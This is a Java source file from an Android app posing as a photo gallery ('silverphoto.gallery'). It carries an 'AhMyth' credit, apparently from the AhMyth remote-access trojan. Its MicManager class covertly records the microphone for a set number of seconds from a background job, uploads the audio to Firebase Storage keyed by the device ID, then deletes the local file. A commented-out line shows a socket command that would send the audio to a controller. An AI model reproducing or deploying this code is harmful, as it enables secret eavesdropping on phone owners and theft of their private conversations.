package org.quantum.silverphoto.gallery.service;

import android.app.job.JobParameters;
import android.content.Context;
import android.media.MediaRecorder;
import android.net.Uri;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by AhMyth on 11/11/16.
 */

public  class MicManager {


    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask stopRecording;


    public static void startRecording(int sec, final Context context, JobParameters params) throws Exception {


        //Creating file
        File dir = context.getCacheDir();
        try {
            Log.e("DIRR" , dir.getAbsolutePath());
            audiofile = File.createTempFile((new SimpleDateFormat("yyyyMMddHHmmss").format(new Date()) + params.getJobId()), ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }


        try {
            //Creating MediaRecorder and specifying audio source, output format, encoder & output format
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            recorder.prepare();
            recorder.start();


            stopRecording = new TimerTask() {
                @Override
                public void run() {
                    //stopping recorder
                    recorder.stop();
                    recorder.release();
                    sendVoice(audiofile, context);
                    audiofile.delete();
                }
            };

            new Timer().schedule(stopRecording, sec*1000);
        } catch (IllegalStateException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void sendVoice(File file, Context context){

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file",true);
            object.put("name",file.getName());
            object.put("buffer" , data);

            String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);

            // Create a storage reference from our app
            FirebaseStorage storage = FirebaseStorage.getInstance();
            StorageReference storageRef = storage.getReference();

// Create a reference to "mountains.jpg"
            StorageReference mountainsRef = storageRef.child(deviceID);

// Create a reference to 'images/mountains.jpg'
            StorageReference mountainImagesRef = mountainsRef.child(new SimpleDateFormat("yyyyMMddHHmmss").format(new Date()));

            Uri fileUri = Uri.fromFile(file);
            UploadTask uploadTask = mountainImagesRef.putFile(fileUri);

// Register observers to listen for when the download is done or if it fails
            uploadTask.addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception exception) {
                    // Handle unsuccessful uploads
                }
            }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                @Override
                public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                    // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
                    Uri downloadUrl = taskSnapshot.getDownloadUrl();
                }
            });
//            IOSocket.getInstance().getIoSocket().emit("x0000mc" , object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

}

